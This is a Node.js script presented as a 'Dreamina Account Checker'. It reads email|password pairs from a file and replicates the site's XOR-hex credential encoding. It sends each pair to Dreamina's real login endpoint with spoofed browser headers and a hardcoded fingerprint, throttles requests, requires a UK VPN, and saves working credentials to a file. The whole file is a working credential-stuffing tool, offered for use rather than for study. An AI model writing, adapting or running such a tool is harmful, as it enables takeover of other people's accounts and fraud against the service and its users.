import fetch from "node-fetch";
import chalk from 'chalk';
import { promises as fs } from 'fs';
import readline from 'readline';
import path from 'path';

function encryptToTargetHex(input) {
  if (!input || typeof input !== 'string') {
    throw new Error('Invalid input for encryption');
  }
  
  let hexResult = "";
  for (const char of input) {
    const encryptedCharCode = char.charCodeAt(0) ^ 0x05;
    hexResult += encryptedCharCode.toString(16).padStart(2, "0");
  }
  return hexResult;
}

async function dreamina_login(email, password) {
  try {
    const encryptedEmail = encryptToTargetHex(email);
    const encryptedPassword = encryptToTargetHex(password);

    const url = new URL('https://dreamina.capcut.com/passport/web/email/login/');
    const queryParams = {
      aid: '513641',
      account_sdk_source: 'web',
      passport_jssdk_version: '1.0.7-beta.2',
      language: 'en',
      verifyFp: 'verify_mcn4m4du_2RcR9YtL_fjY9_4N7p_96P8_KvEHL8td0HwS',
      check_region: '1'
    };

    Object.entries(queryParams).forEach(([key, value]) => {
      url.searchParams.append(key, value);
    });

    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Origin': 'https://dreamina.capcut.com',
      'Referer': 'https://dreamina.capcut.com/login'
    };

    const formData = new URLSearchParams();
    formData.append('mix_mode', '1');
    formData.append('email', encryptedEmail);
    formData.append('password', encryptedPassword);
    formData.append('fixed_mix_mode', '1');

    const response = await fetch(url.toString(), {
      method: 'POST',
      headers: headers,
      body: formData
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.description || data.message || `HTTP error ${response.status}`);
    }

    return {
      status: response.status,
      ...data
    };

  } catch (error) {
    return {
      error: true,
      message: error.message
    };
  }
}

async function checkAccounts() {
  try {
    const accountsData = await fs.readFile('accounts.txt', 'utf-8');
    const accounts = accountsData.trim().split('\n').filter(line => line.includes('|'));
    
    if (accounts.length === 0) {
      console.log(chalk.red('No accounts found in accounts.txt'));
      return;
    }

    console.log(chalk.yellow(`\nChecking ${accounts.length} accounts...\n`));
    
    const validAccounts = [];
    const invalidAccounts = [];

    for (let i = 0; i < accounts.length; i++) {
      const [email, password] = accounts[i].split('|').map(item => item.trim());
      
      // Display email being checked
      process.stdout.write(chalk.cyan(`[${i + 1}/${accounts.length}] Checking: ${email}... `));

      const result = await dreamina_login(email, password);
      
      if (result.message === "success") {
        process.stdout.write(chalk.green('Success\n'));
        validAccounts.push(`${email}|${password}`);
      } else {
        process.stdout.write(chalk.red('Failed\n'));
        invalidAccounts.push(`${email}|${password}|${result.message}`);
      }

      await new Promise(resolve => setTimeout(resolve, 2000));
    }

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    await fs.writeFile(`valid_accounts_${timestamp}.txt`, validAccounts.join('\n'));
    await fs.writeFile(`invalid_accounts_${timestamp}.txt`, invalidAccounts.join('\n'));

    console.log(chalk.green('\nCheck completed!'));
    console.log(chalk.blue(`Valid accounts: ${validAccounts.length}`));
    console.log(chalk.blue(`Invalid accounts: ${invalidAccounts.length}`));
    console.log(chalk.yellow(`Results saved in current directory`));

  } catch (error) {
    console.error(chalk.red('\nAccount check failed:'), error.message);
  }
}

(async () => {
  console.log(chalk.yellow.bold('\nDreamina Account Checker'));
  console.log(chalk.yellow('==================================='));

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  const askQuestion = (question) => new Promise(resolve => {
    rl.question(question, answer => resolve(answer.trim().toLowerCase()));
  });

  const vpnStatus = await askQuestion(chalk.yellow('Are you connected to UK VPN? (y/n): '));
  if (vpnStatus !== 'y') {
    console.log(chalk.red('\nPlease connect to UK VPN first.'));
    rl.close();
    return;
  }

  await checkAccounts();
  rl.close();
})();